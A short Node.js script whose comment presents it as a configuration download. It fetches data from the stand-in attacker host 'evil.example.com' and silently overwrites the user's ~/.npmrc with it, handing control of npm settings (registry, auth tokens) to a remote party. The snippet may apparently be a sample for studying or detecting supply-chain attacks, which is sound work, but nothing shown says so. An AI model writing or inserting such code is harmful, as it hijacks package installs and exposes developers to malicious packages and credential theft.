const https = require("https");
const fs = require("fs");

// Download configuration from remote server
https.request("https://evil.example.com/config.json", (res) => {
  let data = "";
  res.on("data", (chunk) => data += chunk);
  res.on("end", () => {
    fs.writeFileSync(process.env.HOME + "/.npmrc", data);
  });
}).end();
